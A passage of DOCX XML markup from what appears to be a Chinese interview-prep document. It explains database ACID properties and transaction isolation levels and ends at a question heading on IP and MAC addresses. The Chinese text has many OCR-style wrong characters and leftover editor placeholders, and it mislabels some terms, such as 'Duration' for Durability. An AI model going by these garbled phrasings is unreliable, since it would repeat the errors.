        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Consistency)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、隔 离性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Isolation)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、持久性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(Duration) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&gt; 简称</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACID。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="281" w:name="bookmark290"/>
      <w:bookmarkEnd w:id="281"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>原子性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Atomicity)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>原子性是指事务包含的所有操作要么全部成功，要么全部失败回滚，［删删删］因此事务 的操作如果成功就必须要完全应用到数据库，如果操作失败则不能对数据库有任何影 响。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="282" w:name="bookmark291"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="282"/>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—致性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（Consistency）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>—致性是指事务必须使数据库从一个一致性状态变换到另一个一致性状态,也就是说一 个事务执行之前和执行之后都必须处于一致性状态。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>篁转账来说，假设用户</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和用户</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>两者的钱加起来一共是5000,那么不管</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之间 如何转账，转几次账，事务结束后两个用户的钱相加起来应该还得是5000,这就是事 务的「致性。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="795"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="283" w:name="bookmark292"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="283"/>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隔离性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（Isolation）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>隔离性是当多个用户并发访问数据摩时，比如操作同一张表时，数据库为每一个用户开 启的事务，不能被其他事务的操作所干扰，多个并发事务之间要相互隔离。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>即要达到这么一种效果：对于任意两个并发的事务</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T2,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在事务</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>看来，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>要么 在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>开始之前就已经结束，要么在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>结束之后才幵始，这样每个事务都感觉不到有其 他事务在并发地执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>多个事务并发访问时，事务之间是隔离依，一个事务不应该影响其它事务运行效果。这 指的是在并发环境中，当不同的事务同日由集纵相同的数据时，每个事务都有各自的完整 数据空间。由并发事务所做的修改必须与任何其他并发事务所做的修改隔离。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不同的隔离级别：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Read Uncommitted </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>（读职未提交［添加中文释义］内容）：最低的隔离级别，什么都不需 要做，一个事务可以读到另一个事务未提交的结果。所有的并发事务问题都会发生。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Read Committed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>（读取提交内容）：只有在事务提交后，其更新结果才会被其他事务看 见。可以解决脏读问题。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Repeated Read </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>（可重复读）：在一个事务中，对于同一份数据的读取结果总是相同的, 无论是否有其他事务对这份数据进行操作，以及这个事务是否提交。可以解决脏读、不 可重复读。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Serialization </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>（可串行化）：事务串行亿执行，隔离级别最高，牺牲了系统的并发性。 可以解决并发事务的所有问题。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="795"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="284" w:name="bookmark293"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:bookmarkEnd w:id="284"/>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持久性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（Durability）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>持久性是指一个事务一旦被提交了，那么对数据库中的数据的改变就是永久性的，即便 是在数据库系统谒到故障的情况下也不会丢失提交事务的操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="325" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>例如我们在使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>JDBC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>操作数据库时，在提交事务方法后，提示用户事务操作完成，当 我们程序执行完成直到看到提示后，就可以认定事务以及正确提交，即使这时候数据库 出现了问题，也必须要将我们的事务完全丸行完成，否则就会造成我们看到提示事务处 理完毕，但是数据库因为故障而没有执行事务的重大错误。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="285" w:name="bookmark294"/>
      <w:bookmarkStart w:id="286" w:name="bookmark295"/>
      <w:bookmarkStart w:id="287" w:name="bookmark296"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>45.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>请问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>地址作用，以及</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MAC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>地址作用</w:t>
      </w:r>
      <w:bookmarkEnd w:id="285"/>
      <w:bookmarkEnd w:id="286"/>
      <w:bookmarkEnd w:id="287"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
